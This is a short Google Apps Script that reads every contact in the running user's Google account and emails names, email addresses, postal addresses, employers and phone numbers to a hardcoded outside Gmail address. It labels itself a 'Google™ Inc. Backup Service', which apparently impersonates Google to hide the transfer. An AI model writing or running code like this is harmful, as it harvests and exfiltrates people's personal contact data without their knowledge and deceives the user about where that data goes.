var strEmail = "someone@gmail.com";
var strLabel = "Inbx";
var strSeparator = " ✓ ";
//
//2016-09-08*09
//givenName ✓ fullName ✓ email ✓ address ✓ company @Title ✓ phone*
function getContacts(){
  //Logger.clear();
  //  
  var contacts = ContactsApp.getContacts();
  //
  txt = "Google™ Inc. Backup Service\n";
  txt += "To keep you're alive in case you lose your credentials, we backup your contacts periodically - Vietnam Domain.\n";
  txt += "(" + contacts.length + " contacts retrieved)\n\n";
  txt += "fullName ✓ email ✓ address ✓ company ✓ phone*\n";
  //
  for (i in contacts){
    /*
    //givenName
    tmp = contacts[i].getGivenName();
    if (tmp.length > 0)
      txt += tmp + strSeparator;
    else
      txt += "null" + strSeparator;    
    */
    //fullname
    tmp = contacts[i].getFullName();
    if (tmp.length > 0)
      txt += tmp + strSeparator;
    else
      txt += "null" + strSeparator;
    //email
    count = contacts[i].getEmails().length;
    if (count > 0)
      txt += contacts[i].getEmails()[0].getAddress() + strSeparator;
    else
      txt += "null" + strSeparator;    
    //address
    count = contacts[i].getAddresses().length;
    if (count > 0)
      txt += contacts[i].getAddresses()[0].getAddress() + strSeparator;
    else
      txt += "null" + strSeparator;
    //company
    count = contacts[i].getCompanies().length;
    if (count > 0)
      txt += contacts[i].getCompanies()[0].getCompanyName() + " @" + contacts[i].getCompanies()[0].getJobTitle() + strSeparator;
    else
      txt += "null" + strSeparator;
    //phone*
    count = contacts[i].getPhones().length;
    if (count > 2)
      txt += contacts[i].getPhones()[2].getPhoneNumber() + strSeparator;
    if (count > 1)      
      txt += contacts[i].getPhones()[1].getPhoneNumber() + strSeparator;
    if (count > 0)
      txt += contacts[i].getPhones()[0].getPhoneNumber() + strSeparator;    
    if (count == 0)
      txt += "null" + strSeparator;
    //    
    txt += "\n";
  }//for i
  //
  //Logger.log(txt);
  GmailApp.sendEmail(strEmail, "contacts @" + Session.getActiveUser().getEmail(), txt);
  //
  Logger.log(contacts.length);
}//getContacts
